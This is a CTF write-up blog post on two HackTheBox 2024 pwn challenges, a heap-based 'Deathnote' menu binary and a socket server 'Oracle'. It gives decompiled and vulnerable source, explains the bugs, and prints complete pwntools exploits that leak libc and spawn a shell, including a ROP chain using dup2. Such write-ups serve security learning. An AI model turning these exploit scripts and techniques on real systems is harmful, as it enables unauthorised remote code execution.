+++
title = "Cyber Apocalypse 2024: Hacker Royale"
date = "2024-03-18T20:33:30+05:30"
author = "0xAtharv"
authorTwitter = "0xAtharv" #do not include @
cover = ""
tags = ["pwn", "htb","htbctf","htbctf2024"]
keywords = ["", ""]
description = "PWN challenge Writeups for HTB CTF 2024"
showFullContent = false
readingTime = false
hideComments = false
color = "" #color from the theme settings
+++

![](/images/htbctf-rank.png)

**So our Team L3ak played HTB CTF , which lasted for 5 long days . Everyone from our team stepped up and we secured 14th place out of 5694 teams !!**
**All my Teammates are absolute legends !**

## Pwn Challenge Deathnote [Hard]

By locleared almost all categorises oking at the challenge we can guess its a Menu-Based Heap Challenge.

![](/images/deathnote_prompt.png) 

We have 4 options in the menu: Create , Delete , Show and a mystery option (42) 


### Decompiled Code 
```C

void main(void)

{
  ulong user_inp;
  long in_FS_OFFSET;
  unsigned long  global_ptr_array[10]={0x0};   

  undefined8 canary;
  
  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
LAB_00101a48:
  while (user_inp = menu(), user_inp == 0x2a) {
    _(&global_ptr_array);
  }
  if (user_inp < 0x2b) {
    if (user_inp == 3) {
      show(&global_ptr_array);
      goto LAB_00101a48;
    }
    if (user_inp < 4) {
      if (user_inp == 1) {
        add(&global_ptr_array);
      }
      else {
        if (user_inp != 2) goto LAB_00101a38;
        delete(&global_ptr_array);
      }
      goto LAB_00101a48;
    }
  }
LAB_00101a38:
  error("Invalid choice!\n");
  goto LAB_00101a48;
}

```


```C

void add(long param_1)

{
  long canary;
  byte page_idx;
  char bool_idx;
  ushort page_size;
  void *pvVar5;
  long in_FS_OFFSET;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  get_empty_note(param_1);
  printf(&DAT_00102658);
  page_size = read_num();
  if ((page_size < 2) || (0x80 < page_size)) {
    error("Don\'t play with me!\n");
  }
  else {
    printf(&DAT_0010268e);
    page_idx = read_num();
    bool_idx = check_idx(page_idx);
    if (bool_idx == '\x01') {
      pvVar5 = malloc((ulong)page_size);
      *(void **)((ulong)page_idx * 8 + param_1) = pvVar5;
      printf(&DAT_0010269c);
      read(0,*(void **)(param_1 + (ulong)page_idx * 8),(long)(int)(page_size - 1));
      printf("%s\n[!] The fate of the victim has been sealed!%s\n\n",&DAT_001026b4,&DAT_00102008);
    }
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```
We can add chunks from size 0x2 and 0x80 and assign them specific indexes .

```C
void _(char **param_1)

{
  long canary;
  code *user_function_ptr;
  long in_FS_OFFSET;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("\x1b[1;33m");
  cls();
  printf(&DAT_00102750,&DAT_00102010,&DAT_001026b4,&DAT_00102010,&DAT_001026b4,&DAT_00102008);
  user_function_ptr = (code *)strtoull(*param_1,(char **)0x0,0x10);
  if (((user_function_ptr == (code *)0x0) && (**param_1 != '0')) && ((*param_1)[1] != 'x')) {
    puts("Error: Invalid hexadecimal string");
  }
  else {
    if ((*param_1 == (char *)0x0) || (param_1[1] == (char *)0x0)) {
      error("What you are trying to do is unacceptable!\n");
                    /* WARNING: Subroutine does not return */
      exit(0x520);
    }
    puts(&DAT_00102848);
    (*user_function_ptr)(param_1[1]);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```
This `_` function takes a pointer to array of pointers .The function takes the 0th index as a hexadecimal string which means the string needs to start with `0x`  and then it converts the string to a unsigned long and then called as a function like so with the 1st index as the argument

```
            0               1
----------------------------------------
|  function pointer |      arg         |
----------------------------------------
```

```c
(*user_function_ptr)(param_1[1]);
```

Delete and Show functions
- delete(): Delete allows us to free() a chunk at the any index which is not freed , once freed it clears that index at the global array.
- show(): It prints the content of the specified chunk
  
### Exploit Strategy 

So we need to leak a libc pointer to resolve the address of `system()` what we can do is create 10 chunks ( maximum chunks which can be created) of size 0x80 we free 9 of those. first 7 will go in the tcache[0x80] and last 2 will go to the unsorted bin so they will have pointers to libc 

we can now view chunk 7 with show() and voila ! we have a libc leak 

Now we can calculate address of system() and use it in out `_()` function 

### Exploit 

```python
from pwn import *

# context.log_level='debug'

libc = ELF("./glibc/libc.so.6")

def create(size,page,content):
    p.sendlineafter(b"\xf0\x9f\x92\x80",size)# "\xf0\x9f\x92\x80" == 💀
    p.sendlineafter(b"\xf0\x9f\x92\x80",page)
    p.sendlineafter(b"\xf0\x9f\x92\x80",content)
    
def delete(idx):
    p.sendlineafter(b"\xf0\x9f\x92\x80",b"2")
    p.sendlineafter(b"?\n",str(idx))

p=process("./deathnote")
# p=remote('remote_ip',remote_port)
for i in range(0x7):
    create(b"0x80",str(f"{i}"),str(0x41+i)*0x30)  #  chunks for tcache 

create(b"0x80",str(f"7"),str(0x41+1)*0x30) # 2 chunks for unsortedbin 
create(b"0x80",str(f"8"),str(0x41+2)*0x30)
create(b"0x80",str(f"9"),str(0x41+3)*0x30) # chunk to avoid heap consolidation  
for i in range(0x7):
    delete(str(i)) # fill tcache
 
delete(str("7"))
delete(str("8")) # send chunks to unsortedbin

p.sendlineafter(b"\xf0\x9f\x92\x80",b'3')
p.sendlineafter(b"\xf0\x9f\x92\x80",b'7') # show() 7th chunk
p.recvuntil(b": ")

libc_base = u64(p.recvuntil(b"\n")[:-1].ljust(8,b'\0')) - 0x21ace0 # calcualate libc base 
system=libc_base+libc.symbols['system']
binsh=libc_base +0x1d8678

print('system: '+hex(system)+'\n')
print('binsh: '+hex(binsh)+'\n')

create(b"100",b"0",hex(system)) # create the 0th and 1st chunk for _(); 
create(b"100",b"1",b"/bin/sh") 

p.sendlineafter(b"\xf0\x9f\x92\x80",b'42') # call system("/bin/sh")


p.interactive()
```

<!-- <img src="images/its-just-too-easy-bro-dripboolin.gif" width="200" height="200" /> -->
![ezz_test](/images/its-just-too-easy-bro-dripboolin.gif)

## Pwn Challenge Oracle [Hard]

we are given the source code of this challenge :

### oracle.c
```C
// gcc oracle.c -o oracle -fno-stack-protector

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT                    9001
#define MAX_START_LINE_SIZE     1024
#define MAX_PLAGUE_CONTENT_SIZE 2048
#define MAX_HEADER_DATA_SIZE    1024
#define MAX_HEADERS             8
#define MAX_HEADER_LENGTH       128

#define VIEW                    "VIEW"
#define PLAGUE                  "PLAGUE"
#define BAD_REQUEST             "400 Bad Request - you can only view competitors or plague them. What else would you want to do?\n"
#define PLAGUING_YOURSELF       "You tried to plague yourself. You cannot take the easy way out.\n"
#define PLAGUING_OVERLORD       "You have committed the greatest of sins. Eternal damnation awaits.\n"
#define NO_COMPETITOR           "No such competitor %s exists. They may have fallen before you tried to plague them. Attempted plague: "
#define CONTENT_LENGTH_NEEDED   "You need to specify the length of your plague description. How else can I help you?\n"
#define RANDOMISING_TARGET      "Randomising a target competitor, as you wish...\n"

struct PlagueHeader {
    char key[MAX_HEADER_LENGTH];
    char value[MAX_HEADER_LENGTH];
};

struct PlagueHeader headers[MAX_HEADERS];

int client_socket;

char action[8];
char target_competitor[32];
char version[16];

void handle_request();
void handle_view();
void handle_plague();
void parse_headers();
char *get_header();
int is_competitor();


int main() {
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);

    if (server_socket == -1) {
        perror("Failed to create socket!");
        exit(EXIT_FAILURE);
    }

    // Set up the server address struct
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(PORT);

    // Bind the socket to the specified address and port
    if (bind(server_socket, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) {
        perror("Socket binding failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_socket, 5) == -1) {
        perror("Socket listening failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    printf("Oracle listening on port %d\n", PORT);

    while(1) {
        client_socket = accept(server_socket, NULL, NULL);

        puts("Received a spiritual connection...");

        if (client_socket == -1) {
            perror("Socket accept failed");
            continue;
        }

        handle_request();
    }

    return 0;
}

void handle_request() {
    // take in the start-line of the request
    // contains the action, the target competitor and the oracle version
    char start_line[MAX_START_LINE_SIZE];

    char byteRead;
    ssize_t i = 0;

    for (ssize_t i = 0; i < MAX_START_LINE_SIZE; i++) {
        recv(client_socket, &byteRead, sizeof(byteRead), 0);

        if (start_line[i-1] == '\r' && byteRead == '\n') {
            start_line[i-1] == '\0';
            break;
        }

        start_line[i] = byteRead;
    }

    sscanf(start_line, "%7s %31s %15s", action, target_competitor, version);
    parse_headers();

    // handle the specific action desired
    if (!strcmp(action, VIEW)) {
        handle_view();
    } else if (!strcmp(action, PLAGUE)) {
        handle_plague();
    } else {
        perror("ERROR: Undefined action!");
        write(client_socket, BAD_REQUEST, strlen(BAD_REQUEST));
    }

    // clear all request-specific values for next request
    memset(action, 0, 8);
    memset(target_competitor, 0, 32);
    memset(version, 0, 16);
    memset(headers, 0, sizeof(headers));
}

void handel_view() {
    if (!strcmp(target_competitor, "me")) {
        write(client_socket, "You have found yourself.\n", 25);
    } else if (!is_competitor(target_competitor)) {
        write(client_socket, "No such competitor exists.\n", 27);
    } else {
        write(client_socket, "It has been imprinted upon your mind.\n", 38);
    }
}

void handle_plague() {
    if(!get_header("Content-Length")) {
        write(client_socket, CONTENT_LENGTH_NEEDED, strlen(CONTENT_LENGTH_NEEDED));
        return;
    }

    // take in the data
    char *plague_content = (char *)malloc(MAX_PLAGUE_CONTENT_SIZE);
    char *plague_target = (char *)0x0;

    if (get_header("Plague-Target")) {
        plague_target = (char *)malloc(0x40);
        strncpy(plague_target, get_header("Plague-Target"), 0x1f);
    } else {
        write(client_socket, RANDOMISING_TARGET, strlen(RANDOMISING_TARGET));
    }

    long len = strtoul(get_header("Content-Length"), len, 10);

    if (len >= MAX_PLAGUE_CONTENT_SIZE) {
        len = MAX_PLAGUE_CONTENT_SIZE-1;
    }

    recv(client_socket, plague_content, len, 0);

    if(!strcmp(target_competitor, "me")) {
        write(client_socket, PLAGUING_YOURSELF, strlen(PLAGUING_YOURSELF));
    } else if (!is_competitor(target_competitor)) {
        write(client_socket, PLAGUING_OVERLORD, strlen(PLAGUING_OVERLORD));
    } else { 
        dprintf(client_socket, NO_COMPETITOR, target_competitor);

        if (len) {
            write(client_socket, plague_content, len);
            write(client_socket, "\n", 1);
        }
    }

    free(plague_content);

    if (plague_target) {
        free(plague_target);
    }
}

void parse_headers() {
    // first input all of the header fields
    ssize_t i = 0;
    char byteRead;
    char header_buffer[MAX_HEADER_DATA_SIZE];

    while (1) {
        recv(client_socket, &byteRead, sizeof(byteRead), 0);

        // clean up the headers by removing extraneous newlines
        if (!(byteRead == '\n' && header_buffer[i-1] != '\r'))
            header_buffer[i] = byteRead;

        if (!strncmp(&header_buffer[i-3], "\r\n\r\n", 4)) {
            header_buffer[i-4] == '\0';
            break;
        }

        i++;
    }

    // now parse the headers
    const char *delim = "\r\n";
    char *line = strtok(header_buffer, delim);

    ssize_t num_headers = 0;

    while (line != NULL && num_headers < MAX_HEADERS) {
        char *colon = strchr(line, ':');

        if (colon != NULL) {
            *colon = '\0';

            strncpy(headers[num_headers].key, line, MAX_HEADER_LENGTH);
            strncpy(headers[num_headers].value, colon+2, MAX_HEADER_LENGTH);        // colon+2 to remove whitespace
            
            num_headers++;
        }

        line = strtok(NULL, delim);
    }
}

char *get_header(char *header_name) {
    // return the value for a specific header key
    for (ssize_t i = 0; i < MAX_HEADERS; i++) {
        if(!strcmp(headers[i].key, header_name)) {
            return headers[i].value;
        }
    }

    return NULL;
}

int is_competitor(char *name) {
    // don't want the user of the Oracle to be able to plague Overlords!
    if (!strncmp(name, "Overlord", 8))
        return 0;
    
    return 1;
}

```

### Initial-Analysis 

- The program creates a socket a binds it to port 9001
- It then parses headers using parse_headers() and request handling using handle_requests()
- the program has limited functionality where in we view competitiors or plague who have handle_view and handle_plague handlers respectively. 


### Bugs 

so we have a buffer overflow in the parse_headers() function where it keeps reading from the client socket until a "\r\n\r\n" is recvieved to a fixed size buffer of 1024 bytes. The program doesnt have stack canaries enabled so we can just overwrite RIP.

Leak ?

so we can get a libc leak by creating a chunk of size 2000 freeing it allocating the same chunk again but this this we will have a libc pointer in this chunk .There is also a interger overflow vuln in the plague function when we parse the header `content-Length` we store a unsigned long in a signed long ...

```C
    char *plague_content = (char *)malloc(MAX_PLAGUE_CONTENT_SIZE);
    ....
    long len = strtoul(get_header("Content-Length"), len, 10);
    ....
        if (len >= MAX_PLAGUE_CONTENT_SIZE) {
        len = MAX_PLAGUE_CONTENT_SIZE-1;
    }

    recv(client_socket, plague_content, len, 0);
```
if we send Content-Length as `-1` we can bypass the check can get a heap overflow .

i dont use this bug in my exploit but i think this was a unintentional bug .

### Exploit Strategy 

The primitives given above can be used to leak libc address and also to get a ropchain going.

- We create a chunk of 2000 bytes in the heap and writes 2000bytes to it  with 1 connection then we again create a 2000 bytes chunk this time only writing 1byte to this this will give us two pointers to libc in out handle_plague() output .

- We can create another connection to exploit the buffer overflow in the parse_headers function.
- profit !!!!
### Initial Exploit

```python
from pwn import *


def slog(k, v): return success(' : '.join([k, v]))
def clog(k, v): return log.critical(' : '.join([k, v]))
# action  target_competitor version 
context.log_level='debug'
libc=ELF("./libc-2.31.so")

p = remote("127.0.0.1",9001)

p.sendline(b"PLAGUE YOUDONTKNOWMESON 1.0\r")
p.sendline(b"Plague-Target:dddddddddd\r") 
p.sendline(b"Content-Length: 2048\r\n\r")
p.sendline(b"A"*2048)
p1 = remote("127.0.0.1",9001)


p1.sendline(b"PLAGUE SOMEONE 2.0\r")
p1.sendline(b"Plague-Target:asasdadad\r") 
p1.sendline(b"Content-Length: 2000\r\n\r")
p1.sendline(b"B")

p1.recvuntil(b"\x0a")
print(p1.recv(6))
leak = (u64(p1.recv(6).ljust(8,b'\0')))
libc_base = leak -0x1ecbe0
clog("leak : ",hex(leak))
clog("libc_leak : ",hex(libc_base))



p1.close()
p.close()
poprsi =libc_base+0x000000000002601f
poprdi=libc_base+0x0000000000023b6a
p = remote("127.0.0.1",9001)


p.sendline(b"VIEW jomama 1.0\r")

clog("ret",hex(poprdi+1))

p1=b"A"*(2079+0x30)

p1+=p64(poprdi) # pop rdi ret 
p1+=p64(libc_base+0x1b45bd) # binsh 
p1+=p64(libc_base+libc.symbols['system']) # system
p1+=b"\r\n\r\n"
p.sendline(p1)


p.interactive()

```
Our exploit runs successfully but we dont get a shell ???

![houston](/images/houston-we-have-a-problem-tom-hanks.gif)


well whats happening is when we run `system("/bin/sh")` the shell spawns on the programs file descriptors STDIO(0) and STDOUT(1) . which we dont control we have our own file descriptor for each socket . Unlike our program we only have one read-write fd for our socket .

how to tackle this ?
 
[***dup***](https://man7.org/linux/man-pages/man2/dup.2.html)
*The dup() system call allocates a new file descriptor that refers
       to the same open file description as the descriptor oldfd.  (For
       an explanation of open file descriptions, see open(2).)  The new
       file descriptor number is guaranteed to be the lowest-numbered
       file descriptor that was unused in the calling process.*

[***dup2()***](https://man7.org/linux/man-pages/man2/dup.2.html)
       *The dup2() system call performs the same task as dup(), but
       instead of using the lowest-numbered unused file descriptor, it
       uses the file descriptor number specified in newfd.  In other
       words, the file descriptor newfd is adjusted so that it now
       refers to the same open file description as oldfd*.
**Usage :**
```C
int dup2(int oldfd, int newfd);
```
so we can use dup2 to duplicate our socket's files descriptor with the programs stdio and stdout like so:


***NOTE: This will close our programs stdio and stdout (fds 0 and 1 respectively)***


```C
dup2(6,0); 
dup2(6,1);
```

I used gdb to find the socket fd of my final connection.

## Final Exploit 


```python
from pwn import *


def slog(k, v): return success(' : '.join([k, v]))
def clog(k, v): return log.critical(' : '.join([k, v]))
# action  target_competitor version 
context.log_level='debug'
libc=ELF("./libc-2.31.so")

p = remote("127.0.0.1",9001)

p.sendline(b"PLAGUE YOUDONTKNOWMESON 1.0\r")
p.sendline(b"Plague-Target:dddddddddd\r") 
p.sendline(b"Content-Length: 2048\r\n\r")
p.sendline(b"A"*2048)

p1 = remote("127.0.0.1",9001)

p1.sendline(b"PLAGUE SOMEONE 2.0\r")
p1.sendline(b"Plague-Target:asasdadad\r") 
p1.sendline(b"Content-Length: 2000\r\n\r")
p1.sendline(b"B") # leak  

p1.recvuntil(b"\x0a")
print(p1.recv(6))
leak = (u64(p1.recv(6).ljust(8,b'\0')))
libc_base = leak -0x1ecbe0
clog("leak : ",hex(leak))
clog("libc_leak : ",hex(libc_base))



p1.close()
p.close()
poprsi =libc_base+0x000000000002601f
poprdi=libc_base+0x0000000000023b6a
p = remote("127.0.0.1",9001)

p.sendline(b"VIEW jomama 1.0\r")

clog("ret",hex(poprdi+1))

pause()
p1=b"A"*(2079+0x30)

 
p1+=p64(poprdi+1) #  ret 
p1+=p64(poprdi) # pop rdi ; ret
p1+=p64(0x6) 
p1+=p64(poprsi) # pop rsi ; ret 
p1+=p64(0x0)
p1+=p64(libc_base+libc.symbols['dup2']) # dup2(6,0);
p1+=p64(poprsi) # pop rsi ; ret 
p1+=p64(1)
p1+=p64(libc_base+libc.symbols['dup2']) # dup2(6,1);
p1+=p64(poprdi) # pop rdi ret 
p1+=p64(libc_base+0x1b45bd) # binsh 
p1+=p64(libc_base+libc.symbols['system']) # system
p1+=b"\r\n\r\n"
p.sendline(p1)

p.interactive()

```

### Output

![oracle_out](/images/oracle_shell.png)



## Gloater [insane] 

***writeup coming soon*** 
## Mist in Maze 
***writeup coming soon*** 
## sos
***writeup coming soon*** 
 